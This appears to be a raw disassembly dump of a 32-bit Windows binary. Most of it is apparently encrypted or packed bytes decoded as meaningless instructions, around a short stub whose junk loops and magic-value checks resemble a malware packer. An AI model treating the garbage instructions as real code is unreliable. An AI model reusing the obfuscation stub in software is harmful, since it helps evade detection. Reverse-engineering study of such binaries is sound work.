  40d24b:	lods   eax,DWORD PTR ds:[esi]
  40d24c:	lahf   
  40d24d:	xchg   BYTE PTR ds:0x971bd66e,dl
  40d253:	(bad)  
  40d254:	xchg   edx,eax
  40d255:	mov    ah,0xbf
  40d257:	aas    
  40d258:	mov    esi,0xb400ae2c
  40d25d:	loop   0x40d23d
  40d25f:	push   edx
  40d260:	push   esp
  40d261:	xchg   ebp,eax
  40d262:	(bad)  
  40d263:	arpl   dx,si
  40d265:	cmp    eax,0x1d977905
  40d26a:	scas   al,BYTE PTR es:[edi]
  40d26b:	xchg   edx,eax
  40d26c:	(bad)  
  40d26d:	cmp    BYTE PTR [ebx-0x1b6e5067],al
  40d273:	mov    BYTE PTR [edx+0x14],dl
  40d276:	fdiv   st,st(6)
  40d278:	sbb    cl,BYTE PTR [esi+0x75768d58]
  40d27e:	stos   DWORD PTR es:[edi],eax
  40d27f:	enter  0x2e41,0x1
  40d283:	cmp    BYTE PTR ds:[eax-0x15d1bc01],cl
  40d28a:	mov    ss,WORD PTR [ebp-0x62]
  40d28d:	fwait
  40d28e:	das    
  40d28f:	mov    ebx,edi
  40d291:	and    ebx,ebx
  40d293:	lods   al,BYTE PTR ds:[esi]
  40d294:	pop    eax
  40d295:	mov    edi,esp
  40d297:	and    eax,0x3b2c11b3
  40d29c:	mov    edi,0x550acb12
  40d2a1:	nop
  40d2a2:	inc    esi
  40d2a3:	fisttp DWORD PTR [ecx]
  40d2a5:	(bad)  [ecx+0x12a438b]
  40d2ab:	ins    DWORD PTR es:[edi],dx
  40d2ac:	neg    DWORD PTR [eax]
  40d2ae:	jno    0x40d2df
  40d2b0:	loope  0x40d2e0
  40d2b2:	and    BYTE PTR [ebx-0x5b],dl
  40d2b5:	outs   dx,BYTE PTR ds:[esi]
  40d2b6:	add    DWORD PTR [ecx-0x42],ebp
  40d2b9:	repz inc esp
  40d2bb:	pop    esp
  40d2bc:	lods   al,BYTE PTR ds:[esi]
  40d2bd:	push   esp
  40d2be:	cmp    eax,0x976091d
  40d2c3:	pop    ecx
  40d2c4:	pop    ebx
  40d2c5:	mov    ds:0xb6ebe4f8,al
  40d2ca:	mov    ds:0x9db9a504,eax
  40d2cf:	pushf  
  40d2d0:	dec    DWORD PTR [eax+eax*4-0x3]
  40d2d4:	or     DWORD PTR [edx-0x56d08dc0],edi
  40d2da:	test   esi,ebx
  40d2dc:	sbb    DWORD PTR [edx-0x67],0xa171aac0
  40d2e3:	ficomp WORD PTR [edx]
  40d2e5:	aam    0x5
  40d2e7:	xor    eax,0x950fa45
  40d2ec:	lea    ebx,[ebx]
  40d2ee:	scas   al,BYTE PTR es:[edi]
  40d2ef:	mov    bh,bh
  40d2f1:	adc    eax,0x8dfa85d6
  40d2f6:	sub    cl,BYTE PTR [esi+0x41a39dce]
  40d2fc:	jecxz  0x40d2b0
  40d2fe:	ja     0x40d34d
  40d300:	jl     0x40d288
  40d302:	add    eax,0x10e99716
  40d307:	fnstsw WORD PTR [edx-0x41]
  40d30a:	xchg   ebp,eax
  40d30b:	dec    ebp
  40d30c:	sbb    al,0xf4
  40d30e:	jno    0x40d323
  40d310:	xchg   esp,eax
  40d311:	or     BYTE PTR [eax],ah
  40d313:	add    BYTE PTR [edi-0x49fc78bb],bl
  40d319:	cwde   
  40d31a:	adc    DWORD PTR [edx+0x6a],edx
  40d31d:	inc    esi
  40d31e:	pop    esi
  40d31f:	dec    edi
  40d320:	int3   
  40d321:	push   eax
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	add    DWORD PTR [esi-0x684fb67d],edx
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	int3   
  40d345:	and    DWORD PTR [ecx],edi
  40d347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d348:	ret    0x5e3b
  40d34b:	pop    edx
  40d34c:	das    
  40d34d:	into   
  40d34e:	movsx  ecx,BYTE PTR [ecx]
  40d351:	add    eax,0xa7988797
  40d356:	mov    ch,0xc2
  40d358:	sub    al,BYTE PTR [esp+ecx*8]
  40d35b:	(bad)
  40d35e:	mov    esp,0x176c3cb0
  40d363:	pop    esi
  40d364:	loopne 0x40d356
  40d366:	inc    eax
  40d367:	cmp    eax,0xf47d2705
  40d36c:	sub    eax,0x965c5f4b
  40d371:	ins    DWORD PTR es:[edi],dx
  40d372:	push   ss
  40d373:	pop    edi
  40d374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d375:	das    
  40d376:	ss out 0x75,al
  40d379:	xchg   edx,eax
  40d37a:	fsubr  QWORD PTR [ebx+0x37]
  40d37d:	cwde   
  40d37e:	pusha  
  40d37f:	rcr    DWORD PTR [esi+0x72],1
  40d382:	mov    ah,0xa
  40d384:	lods   al,BYTE PTR ds:[esi]
  40d385:	inc    ecx
  40d386:	js     0x40d3b1
  40d388:	pop    eax
  40d389:	mov    cl,0xee
  40d38b:	loop   0x40d30d
  40d38d:	push   ebx
  40d38e:	push   ds
  40d38f:	das    
  40d390:	push   ds
  40d391:	sbb    eax,0x4d1c2753
  40d396:	call   0xb49b:0xad23fcfa
  40d39d:	jmp    0x3014:0xe236d9e0
  40d3a4:	xchg   esi,eax
  40d3a5:	xorps  xmm5,XMMWORD PTR [ebp+edi*4-0x35]
  40d3aa:	inc    esp
  40d3ab:	pop    esi
  40d3ac:	sbb    BYTE PTR [ebp+esi*2-0x62],0x65
  40d3b1:	ss sub al,0x1
  40d3b4:	sbb    eax,DWORD PTR [esp+edx*1+0x1e]
  40d3b8:	dec    eax
  40d3b9:	test   BYTE PTR [esi-0x54],dl
  40d3bc:	lds    eax,FWORD PTR [esi+0x425ec4]
  40d3c2:	daa    
  40d3c3:	add    al,0x9a
  40d3c5:	pop    ebp
  40d3c6:	xlat   BYTE PTR ds:[ebx]
  40d3c7:	fs aas 
  40d3c9:	jbe    0x40d3e2
  40d3cb:	add    BYTE PTR [eax*8+0x43754aa6],ch
  40d3d2:	outs   dx,BYTE PTR ds:[esi]
  40d3d3:	add    ebx,DWORD PTR [esi]
  40d3d5:	in     al,dx
  40d3d6:	sahf   
  40d3d7:	outs   dx,DWORD PTR ds:[esi]
  40d3d8:	jmp    0x8b8ab34d
  40d3dd:	sub    ah,dh
  40d3df:	dec    ecx
  40d3e0:	add    eax,0x22003747
  40d3e5:	(bad)  
  40d3e6:	rcl    BYTE PTR [eax],1
  40d3e8:	jne    0x40d39e
  40d3ea:	gs mov ss,edx
  40d3ed:	retf   0x33c2
  40d3f0:	enter  0x153a,0xfd
  40d3f4:	jbe    0x40d3c9
  40d3f6:	ins    BYTE PTR es:[edi],dx
  40d3f7:	push   ecx
  40d3f8:	gs mov edx,0xe6d7315f
  40d3fe:	adc    DWORD PTR [edx-0x2859d1cc],0x7729aca1
  40d408:	stos   BYTE PTR es:[edi],al
  40d409:	outs   dx,BYTE PTR ds:[esi]
  40d40a:	outs   dx,BYTE PTR ds:[esi]
  40d40b:	jb     0x40d3e3
  40d40d:	pop    ebp
  40d40e:	pop    ebp
  40d40f:	icebp  
  40d410:	inc    ecx
  40d411:	or     BYTE PTR [ecx+0x55dcbb38],bl
  40d417:	sbb    eax,0xd065f241
  40d41c:	sbb    eax,0x5229f061
  40d421:	(bad)  
  40d422:	mov    edx,0x347a5aa0
  40d427:	mov    edx,0xbd36788e
  40d42c:	mov    ds:0x1f0b446,al
  40d431:	or     BYTE PTR [si],ch
  40d434:	ja     0x40d3c6
  40d436:	inc    eax
  40d437:	fimul  WORD PTR [edx+eiz*8+0xd7b35c5]
  40d43e:	push   edx
  40d43f:	cmp    ecx,0x48
  40d442:	data16 mov bh,0x70
  40d445:	mov    dl,0x89
  40d447:	imul   ebp,ecx,0xa1124468
  40d44d:	and    al,0x66
  40d44f:	dec    edi
  40d450:	inc    edi
  40d451:	cmp    ecx,DWORD PTR [ebx]
  40d453:	js     0x40d4c7
  40d455:	mov    bh,0xe0
  40d457:	arpl   WORD PTR [eax-0x76ed3e36],di
  40d45d:	add    bh,BYTE PTR [ebx+0x451f76e8]
  40d463:	lods   eax,DWORD PTR ds:[esi]
  40d464:	mov    ch,0x36
  40d466:	jmp    0x40d42d
  40d468:	mov    DWORD PTR [ebx+0x38],esp
  40d46b:	mov    ?,WORD PTR [esi]
  40d46d:	add    BYTE PTR [edx-0x8],dh
  40d470:	loopne 0x40d44c
  40d472:	in     al,0x12
  40d474:	push   0x7aca99c8
  40d479:	stc    
  40d47a:	xchg   edx,eax
  40d47b:	xor    bh,BYTE PTR ds:0x8d68e7cc
  40d481:	xchg   ecx,eax
  40d482:	xchg   DWORD PTR [edx+0x76],ebp
  40d485:	jecxz  0x40d4ca
  40d487:	outs   dx,DWORD PTR ds:[esi]
  40d488:	retf   
  40d489:	or     al,0xf2
  40d48b:	in     al,dx
  40d48c:	stos   DWORD PTR es:[edi],eax
  40d48d:	call   0xdeb9:0x9fa559f2
  40d494:	ins    BYTE PTR es:[edi],dx
  40d495:	pushf  
  40d496:	cdq    
  40d497:	nop
  40d498:	mov    esp,0x15e456a5
  40d49d:	and    cl,BYTE PTR [ecx+0x6581bd08]
  40d4a3:	fwait
  40d4a4:	mov    ecx,0x22855d3d
  40d4a9:	stos   BYTE PTR es:[edi],al
  40d4aa:	aas    
  40d4ab:	xor    al,0xcd
  40d4ad:	sbb    eax,0x891cc48c
  40d4b2:	mov    edx,0xbf64abdb
  40d4b7:	or     DWORD PTR [ecx],esi
  40d4b9:	imul   eax,DWORD PTR [ebx-0x58],0x305fd7de
  40d4c0:	xor    eax,0xa7e49696
  40d4c5:	mov    ebp,0xdda4cd42
  40d4ca:	stos   BYTE PTR es:[edi],al
  40d4cb:	scas   eax,DWORD PTR es:[edi]
  40d4cc:	jnp    0x40d4b5
  40d4ce:	pusha  
  40d4cf:	daa    
  40d4d0:	cmp    al,0xc7
  40d4d2:	mov    eax,0xc8936fa2
  40d4d7:	or     BYTE PTR [eax-0x77b63ab0],ch
  40d4dd:	adc    BYTE PTR [ecx+0x163c27b8],0xc5
  40d4e4:	dec    ebp
  40d4e5:	ins    DWORD PTR es:[edi],dx
  40d4e6:	or     edx,DWORD PTR [esi]
  40d4e8:	dec    ecx
  40d4e9:	pop    edx
  40d4ea:	mov    DWORD PTR ds:0xa2b91d7b,edx
  40d4f0:	ror    ah,1
  40d4f2:	push   es
  40d4f3:	dec    ebp
  40d4f4:	shl    DWORD PTR [eax-0x23],0xba
  40d4f8:	mov    ebp,0xf86c0658
  40d4fd:	mov    DWORD PTR [eax],edx
  40d4ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d500:	lahf   
  40d501:	xchg   DWORD PTR [esp+ebx*8],ebp
  40d504:	mov    ebx,fs
  40d506:	mov    edi,0xb5a43c99
  40d50b:	scas   al,BYTE PTR es:[edi]
  40d50c:	repnz mov WORD PTR [ecx+0x2e765b1d],es
  40d513:	cmp    eax,0x2db3f8d8
  40d518:	and    edx,ecx
  40d51a:	and    DWORD PTR [ebp+0x6a344ec5],edx
  40d520:	nop
  40d521:	xchg   ecx,eax
  40d522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d523:	pop    ss
  40d524:	outs   dx,BYTE PTR ds:[esi]
  40d525:	retf   
  40d526:	jmp    0xaa7e:0x692ebbd0
  40d52d:	push   ds
  40d52e:	jne    0x40d4e1
  40d530:	int    0x43
  40d532:	xchg   esp,eax
  40d533:	mov    al,0xe1
  40d535:	cmp    eax,0xeb44c1ae
  40d53a:	mov    esp,cs
  40d53c:	xor    eax,0xfd08bbda
  40d541:	fmulp  st(2),st
  40d543:	scas   al,BYTE PTR es:[edi]
  40d544:	fs or  al,0xbd
  40d547:	cli    
  40d548:	pusha  
  40d549:	dec    edx
  40d54a:	inc    esp
  40d54b:	jmp    0x40d587
  40d54d:	mov    ds:0xbe13130d,al
  40d552:	jp     0x40d576
  40d554:	dec    eax
  40d555:	pop    esp
  40d556:	(bad)  [eax]
  40d558:	scas   eax,DWORD PTR es:[edi]
  40d559:	jmp    0xbbba:0xba6084f1
  40d560:	ins    BYTE PTR es:[edi],dx
  40d561:	fcom   DWORD PTR [ebp-0x6857b0f9]
  40d567:	cmp    edx,DWORD PTR [eax]
  40d569:	repz sbb BYTE PTR [edi-0x20948d17],dl
  40d570:	loopne 0x40d555
  40d572:	cmp    al,BYTE PTR [esi+0x62]
  40d575:	movups xmm3,xmm0
  40d578:	(bad)  
  40d579:	mov    edi,0xdd0a96d7
  40d57e:	lahf   
  40d57f:	sahf   
  40d580:	sbb    ch,al
  40d582:	(bad)  
  40d583:	sub    al,BYTE PTR [ebp+0x36]
  40d586:	mov    WORD PTR [ebp-0x4f],cs
  40d589:	adc    eax,DWORD PTR [ebx+0x3]
  40d58c:	sbb    al,0x1a
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4337a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433797,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43379b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4337a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4337e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43379b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433827,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43382f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43375b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4337db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433817,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433817
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433817,edx
  40d64f:	cmp    DWORD PTR ds:0x433817,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433817,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433763,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433763
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433763,edx
  40d68b:	cmp    DWORD PTR ds:0x433763,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433853
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433763,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433767
  40d6b7:	add    eax,DWORD PTR ds:0x43379b
  40d6bd:	mov    ds:0x433767,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x3ca0482a
  40d6f9:	jnp    0x40d737
  40d6fb:	or     BYTE PTR [edx-0x6e],bh
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d6a5
  40d705:	rcr    DWORD PTR [esi],1
  40d707:	adc    al,0xe1
  40d709:	jmp    0x40d73d
  40d70b:	retf   
  40d70c:	sbb    al,0x31
  40d70e:	or     eax,0x288a7254
  40d713:	out    dx,al
  40d714:	and    cl,dh
  40d716:	jb     0x40d760
  40d718:	mov    ah,0x56
  40d71a:	stc    
  40d71b:	add    bl,BYTE PTR [esi-0x62]
  40d71e:	mov    eax,0xfe76f444
  40d723:	fdiv   st,st(3)
  40d725:	scas   eax,DWORD PTR es:[edi]
  40d726:	cmc    
  40d727:	fldenv [ebx-0x6e823a63]
  40d72e:	adc    eax,0x50373c2d
  40d733:	loop   0x40d6ec
  40d735:	mov    eax,0xc0c3deb5
  40d73a:	popf   
  40d73b:	push   esp
  40d73c:	es xchg edi,eax
  40d73e:	and    edx,DWORD PTR [ebp-0x13]
  40d741:	stc    
  40d742:	into   
  40d743:	ds push esp
  40d745:	jae    0x40d768
  40d747:	lods   al,BYTE PTR ds:[esi]
  40d748:	sbb    eax,ebx
  40d74a:	sub    edi,esp
  40d74c:	dec    edx
  40d74d:	cmp    eax,0xac334594
  40d752:	lods   eax,DWORD PTR ds:[esi]
  40d753:	outs   dx,BYTE PTR ds:[esi]
  40d754:	or     eax,0xbfb9fdd4
  40d759:	jmp    0xee2864dd
  40d75e:	int3   
  40d75f:	data16 (bad) 
  40d761:	cwde   
  40d762:	(bad)  
  40d763:	call   DWORD PTR [esi-0x1390e18d]
  40d769:	jp     0x40d6f9
  40d76b:	mov    eax,0xf0f9c56f
  40d770:	mov    edx,edx
  40d772:	dec    ebp
  40d773:	mov    esi,0x9bc99f2e
  40d778:	mov    ebp,0x51989175
  40d77d:	push   ebp
  40d77e:	dec    eax
  40d77f:	cdq    
  40d780:	pop    ss
  40d781:	cmp    ah,BYTE PTR [ebx-0x60ddc65]
  40d787:	sbb    al,0xab
  40d789:	pop    edi
  40d78a:	loop   0x40d71d
  40d78c:	xor    al,0x39
  40d78e:	dec    eax
  40d78f:	jp     0x40d7f8
  40d791:	icebp  
  40d792:	adc    DWORD PTR [ebx+esi*4-0x49],esp
  40d796:	pop    ecx
  40d797:	daa    
  40d798:	addr16 inc ebx
  40d79a:	ds and eax,0x519d9f3a
  40d7a0:	xor    ebp,DWORD PTR [edx]
  40d7a2:	mov    DWORD PTR [ecx+0x540350a7],ecx
  40d7a8:	iret   
  40d7a9:	dec    BYTE PTR [ebx]
  40d7ab:	out    dx,al
  40d7ac:	mov    ds:0xf3c8c40a,al
  40d7b1:	lds    ebp,FWORD PTR [ecx+esi*8-0x29e8588d]
  40d7b8:	test   ah,bl
  40d7ba:	adc    BYTE PTR [ebx],dh
  40d7bc:	cwde   
  40d7bd:	adc    DWORD PTR gs:[eax-0x4f],ebx
  40d7c1:	xchg   BYTE PTR [esi+edx*8],dl
  40d7c4:	mov    ds:0xadeda2ba,eax
  40d7c9:	adc    esi,DWORD PTR [ecx]
  40d7cb:	pop    esp
  40d7cc:	test   BYTE PTR [ebx+0x79],0x0
  40d7d0:	jmp    0x40d7a7
  40d7d2:	adc    BYTE PTR [esi-0x45b393d6],ch
  40d7d8:	jne    0x40d76d
  40d7da:	adc    DWORD PTR [edx+0x5a],0x59cda0bb
  40d7e1:	test   al,0x9
  40d7e3:	std    
  40d7e4:	cdq    
  40d7e5:	pushf  
  40d7e6:	fistp  QWORD PTR [edi-0x3e]
  40d7e9:	xchg   ebp,eax
  40d7ea:	rcl    bh,cl
  40d7ec:	arpl   WORD PTR [esp+ebp*1+0x61],si
  40d7f0:	mov    edi,0x227a67f4
  40d7f5:	inc    ebx
  40d7f6:	mov    al,0x98
  40d7f8:	mov    DWORD PTR [edi],edx
  40d7fa:	int3   
  40d7fb:	or     al,0xff
  40d7fd:	fst    QWORD PTR [esi-0x3d]
  40d800:	or     eax,0x96d9be5e
  40d805:	push   edi
  40d806:	adc    eax,0x36aa1cc5
  40d80b:	dec    edi
  40d80c:	pop    DWORD PTR [esi+0x10]
  40d80f:	sbb    al,0x4e
  40d811:	xchg   DWORD PTR [edi+0x4f21d798],edx
  40d817:	pop    ss
  40d818:	pop    edi
  40d819:	icebp  
  40d81a:	xlat   BYTE PTR ds:[ebx]
  40d81b:	leave  
  40d81c:	xor    dl,BYTE PTR [ebx+0x23]
  40d81f:	(bad)  
  40d820:	pop    edi
  40d821:	ror    ebp,1
  40d823:	fdivr  DWORD PTR [esi+0x5493ce88]
  40d829:	outs   dx,DWORD PTR ds:[esi]
  40d82a:	sar    DWORD PTR [edi+0x24],cl
  40d82d:	adc    eax,0x9815c93b
  40d832:	inc    ebx
  40d833:	inc    esi
  40d834:	dec    edx
  40d835:	cmp    eax,DWORD PTR [ebx-0x58]
  40d838:	or     edx,edx
  40d83a:	cld    
  40d83b:	pop    ebp
  40d83c:	cli    
  40d83d:	scas   al,BYTE PTR es:[edi]
  40d83e:	sbb    BYTE PTR [ebx-0x7a8dc3d6],bl
  40d844:	xor    eax,0x6c5432de
  40d849:	jae    0x40d824
  40d84b:	xor    al,0x9e
  40d84d:	adc    eax,0x87305e5c
  40d852:	sbb    eax,0x667dd9db
  40d857:	sub    DWORD PTR [eax],edi
  40d859:	mov    dh,0x56
  40d85b:	cmp    eax,0x798b4cb5
  40d860:	sti    
  40d861:	pop    eax
  40d862:	adc    edi,DWORD PTR [esi+esi*4]
  40d865:	fwait
  40d866:	mov    ah,0x35
  40d868:	aas    
  40d869:	cmp    BYTE PTR [esi*1-0x57abebbe],dl
  40d870:	(bad)  
  40d871:	mov    esp,0x5651c447
  40d876:	sahf   
  40d877:	imul   esp,ebx,0x104f90ee
  40d87d:	loopne 0x40d842
  40d87f:	and    eax,edi
  40d881:	jmp    0xf61:0xbda7ad0d
  40d888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d889:	out    dx,al
  40d88a:	scas   al,BYTE PTR es:[edi]
  40d88b:	enter  0x73b5,0xab
  40d88f:	mov    ah,0x8f
  40d891:	xchg   ebx,eax
  40d892:	aas    
  40d893:	mov    BYTE PTR [esp+ecx*8+0x246682be],cl
  40d89a:	mov    dl,0x53
  40d89c:	add    BYTE PTR [edi-0x28],0x6a
  40d8a0:	loopne 0x40d866
  40d8a2:	adc    ecx,DWORD PTR [eax-0x20bbc74b]
  40d8a8:	jae    0x40d847
  40d8aa:	push   0xb29ce531
  40d8af:	sar    DWORD PTR [edi-0x2a],cl
  40d8b2:	loop   0x40d86e
  40d8b4:	hlt    
  40d8b5:	mov    bh,cl
  40d8b7:	adc    eax,DWORD PTR [esi+0x59]
  40d8ba:	hlt    
  40d8bb:	dec    ebp
  40d8bc:	clc    
  40d8bd:	das    
  40d8be:	sub    eax,DWORD PTR [edi]
  40d8c0:	adc    al,0xe4
  40d8c2:	scas   eax,DWORD PTR es:[edi]
  40d8c3:	mov    WORD PTR [edx+0x58e28f6e],?
  40d8c9:	fistp  QWORD PTR [esi-0x48]
  40d8cc:	(bad)  
  40d8cd:	jmp    0x2bb51f5b
  40d8d2:	and    al,0xd
  40d8d4:	repnz mov eax,0x8f65d42c
  40d8da:	shl    eax,1
  40d8dc:	cmc    
  40d8dd:	xchg   esi,eax
  40d8de:	mov    bh,BYTE PTR [ebp-0x69a22739]
  40d8e4:	pop    esi
  40d8e5:	xor    al,BYTE PTR [ebx+esi*2]
  40d8e8:	sahf   
  40d8e9:	lahf   
  40d8ea:	xor    DWORD PTR [edi],esp
  40d8ec:	loop   0x40d8bd
  40d8ee:	jb     0x40d8de
  40d8f0:	mov    ecx,DWORD PTR [esi+ebx*4]
  40d8f3:	lock ret 
  40d8f5:	test   edi,0xf0de383f
  40d8fb:	jmp    FWORD PTR [edx+0x4c]
  40d8fe:	jmp    0xc27c0520
  40d903:	jne    0x40d903
  40d905:	lds    ecx,FWORD PTR [esi+0xa]
  40d908:	ret    
  40d909:	fcom   QWORD PTR [eax-0x47]
  40d90c:	(bad)  
  40d90d:	out    dx,al
  40d90e:	mov    cl,0x1d
  40d910:	fcomip st,st(1)
  40d912:	mov    edi,0x73a36010
  40d917:	mov    dh,0xdd
  40d919:	jbe    0x40d93c
  40d91b:	(bad)  
  40d91c:	cwde   
  40d91d:	(bad)  
  40d91f:	loop   0x40d8da
  40d921:	jmp    0xeb92:0xe53e40e0
  40d928:	out    dx,eax
  40d929:	js     0x40d8f0
  40d92b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d92c:	sbb    eax,0xfb7e6f1f
  40d931:	sti    
  40d932:	pop    ds
  40d933:	shr    edx,cl
  40d935:	mov    ebp,0x508d6fc5
  40d93a:	inc    esi
  40d93b:	loop   0x40d934
  40d93d:	bound  edx,QWORD PTR [esi+0x78]
  40d940:	add    DWORD PTR [eax],eax
  40d942:	clc    
  40d943:	sbb    DWORD PTR [ecx-0x7ba74ff],ecx
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xd12b51ed
  40d96a:	lea    ebx,[eax-0x4c]
  40d96d:	cmp    dl,BYTE PTR [eax+0x7c3e7e7e]
  40d973:	jle    0x40d9f3
  40d975:	out    0x15,al
  40d977:	and    BYTE PTR [ecx-0x16],bl
  40d97a:	mov    sp,0xd08
  40d97e:	push   esp
  40d97f:	loop   0x40d9aa
  40d981:	clc    
  40d982:	pop    es
  40d983:	jmp    0x6b3ee76b
  40d988:	pop    esi
  40d989:	or     ecx,eax
  40d98b:	push   edx
  40d98c:	push   edx
  40d98d:	into   
  40d98e:	fild   WORD PTR [esi+0x453585eb]
  40d994:	push   esp
  40d995:	dec    eax
  40d996:	loop   0x40d92c
  40d998:	dec    edi
  40d999:	adc    eax,0x57f9c3b3
  40d99e:	nop
  40d99f:	jnp    0x40d934
  40d9a1:	pop    ebx
  40d9a2:	rcl    BYTE PTR [edi-0x1dcec276],cl
  40d9a8:	repnz test eax,0xcf369c35
  40d9ae:	pop    edi
  40d9af:	stc    
  40d9b0:	or     DWORD PTR [edx+0x3a],eax
  40d9b3:	fidiv  WORD PTR [eax-0x1ffe0a4f]
  40d9b9:	push   cs
  40d9ba:	out    0x92,eax
  40d9bc:	adc    al,0x8f
  40d9be:	bound  esi,QWORD PTR [edx+esi*1-0x7cabe30]
  40d9c5:	jl     0x40d9d3
  40d9c7:	dec    ebx
  40d9c8:	rcr    BYTE PTR [esi],1
  40d9ca:	cli    
  40d9cb:	mov    al,BYTE PTR [ebx]
  40d9cd:	add    BYTE PTR [edi],dh
  40d9cf:	adc    ecx,edx
  40d9d1:	adc    al,0x97
  40d9d3:	fisttp WORD PTR [esi]
  40d9d5:	and    al,0xdf
  40d9d8:	iret   
  40d9d9:	out    dx,al
  40d9da:	scas   al,BYTE PTR es:[edi]
  40d9db:	push   0x5b
  40d9dd:	ins    BYTE PTR es:[edi],dx
  40d9de:	adc    al,0x6a
  40d9e0:	shl    DWORD PTR [ecx+0x744f9cda],0xa6
  40d9e7:	sti    
  40d9e8:	lahf   
  40d9e9:	mov    eax,0x617b06a0
  40d9ee:	mov    eax,0x31ae628e
  40d9f3:	inc    edi
  40d9f4:	mov    eax,0x3e65e333
  40d9f9:	push   ebp
  40d9fa:	cmp    DWORD PTR [edi],edi
  40d9fc:	jmp    FWORD PTR [edi-0x18]
  40d9ff:	xor    BYTE PTR [ebx+esi*4-0x50],al
  40da03:	inc    edx
  40da04:	sub    BYTE PTR [esi+ecx*2],al
  40da07:	and    DWORD PTR [ecx-0x6e23bc3d],ecx
  40da0d:	paddw  mm6,QWORD PTR [eax+0x5e79f1d3]
  40da14:	repz inc BYTE PTR [edi+0x51]
  40da18:	es push cs
  40da1a:	mov    ecx,0x49aa7d0f
  40da1f:	and    ebx,DWORD PTR [ebx+0x5f0bff5c]
  40da25:	sbb    bh,BYTE PTR [ebp+0x6f]
  40da28:	adc    eax,0xcaf3070
  40da2d:	cmp    edi,DWORD PTR [esp+edx*8-0x7f]
  40da31:	cmp    edi,ebp
  40da33:	aam    0xea
  40da35:	xchg   esp,eax
  40da36:	dec    esp
  40da37:	(bad)  
  40da39:	das    
  40da3a:	mov    dl,0xb4
  40da3c:	call   0x55ab:0x8dfb91b0
  40da43:	dec    BYTE PTR [ecx]
  40da45:	mov    esp,0x589bed59
  40da4a:	outs   dx,BYTE PTR ds:[esi]
  40da4b:	fwait
  40da4c:	xchg   edi,eax
  40da4d:	iret   
  40da4e:	imul   DWORD PTR [ecx+0x56cb59e4]
  40da54:	aaa    
  40da55:	lock bound eax,QWORD PTR [edx+0x67]
  40da59:	mov    edx,0x7c3acfb9
  40da5e:	fld    QWORD PTR ds:0xe2cb81aa
  40da64:	or     BYTE PTR [esi+0x7e],dl
